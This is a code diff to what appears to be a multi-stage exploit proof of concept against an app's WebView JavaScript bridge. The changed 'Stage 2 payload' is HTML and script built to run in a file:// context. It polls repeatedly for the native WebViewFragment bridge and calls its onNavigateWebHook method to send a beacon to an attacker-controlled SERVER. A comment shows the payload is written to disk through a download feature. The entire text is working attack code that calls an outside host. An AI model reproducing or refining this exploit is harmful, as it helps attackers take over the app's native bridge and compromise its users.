@@ -31,18 +31,23 @@ if (typeof WebViewFragment === "undefined") {
 
     // --- Stage 2 payload (will run in file:// context) ---
     var stage2Html = '<html><body><h1 id="s">Checking...</h1><script>'
-        + 'var hasBridge = (typeof WebViewFragment !== "undefined");'
-        + 'document.getElementById("s").innerText = "JS ran. Bridge=" + hasBridge;'
-        + 'if (hasBridge) {'
-        + '  WebViewFragment.onNavigateWebHook(JSON.stringify({'
-        + '    "version": "1.2",'
-        + '    "type": "externalWebview",'
-        + '    "destination": "' + SERVER + '/log?step=5-file-context-alive-bridge-works"'
-        + '  }));'
-        + '} else {'
-        + '  document.title = "FAIL-no-bridge-in-file-context";'
-        + '}'
-        + '<\\/script></body></html>';
++ 'function tryBridge(attempt) {'
++ '  var hasBridge = (typeof WebViewFragment !== "undefined");'
++ '  document.getElementById("s").innerText = "Attempt " + attempt + ": Bridge=" + hasBridge;'
++ '  if (hasBridge) {'
++ '    WebViewFragment.onNavigateWebHook(JSON.stringify({'
++ '      "version": "1.2",'
++ '      "type": "externalWebview",'
++ '      "destination": "' + SERVER + '/log?step=5-bridge-found-attempt-" + attempt'
++ '    }));'
++ '  } else if (attempt < 10) {'
++ '    setTimeout(function() { tryBridge(attempt + 1); }, 500);'
++ '  } else {'
++ '    document.getElementById("s").innerText = "FAIL: bridge never appeared after " + attempt + " attempts";'
++ '  }'
++ '}'
++ 'tryBridge(1);'
++ '<\/script></body></html>';
 
     // --- Step 3: Write stage 2 to disk via DYNAMIC_DOWNLOAD_DOCUMENT ---
     try {
